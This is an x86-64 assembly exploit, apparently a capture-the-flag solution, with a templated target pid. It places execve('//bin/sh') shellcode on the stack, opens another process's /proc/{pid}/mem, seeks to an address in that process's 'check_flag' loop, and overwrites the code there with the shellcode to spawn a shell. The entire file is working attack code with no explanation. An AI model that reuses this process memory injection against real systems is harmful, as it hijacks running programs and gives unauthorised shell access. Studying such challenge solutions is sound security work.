#include <sys/syscall.h>

.globl	main
.type	main, @function

main:

# save current rsp
mov		%rsp, %r15

// put shellcode on the stack (len 28)
mov     $0x90909090050f3bb0, %r8
push    %r8
mov     $0xc03148e789485756, %r8
push    %r8
mov     $0x68732f6e69622f2f, %r8
push    %r8
mov     $0xbf48f63148d23148, %r8
push    %r8

mov		%rsp, %r8

// Open the child memory file
// fd = open("/proc/{pid}/mem", 1)
xor		%rdx, %rdx
push	%rdx
mov		$0x6d656d2f2f2f2f2f, %rdx
push	%rdx
mov		$0x{pid}, %rdx
push	%rdx
mov		$0x2f636f72702f2f2f, %rdx
push	%rdx
mov		%rsp, %rdi
xor		%rsi, %rsi
inc		%rsi
xor		%rax, %rax
mov		$0x2, %al
syscall
mov		%rax, %r9

// Write the shellcode into the child process memory space
// 0x40223a (while loop in check_flag)
// proc/mem fd in r9
// shellcode ptr in r8

// lseek(fd, 0x40223a, 0)
mov		%r9, %rdi
mov		$0x40223a, %rsi // jmp dst after sleep in check_flag
xor		%rdx, %rdx
xor		%rax, %rax
mov		$0x8, %al
syscall

// write(fd, shellcode, 28)
mov		%r9, %rdi
mov		%r8, %rsi
xor		%rdx, %rdx
mov		$28, %dl
xor		%rax, %rax
inc		%rax
syscall

loop:
jmp		loop
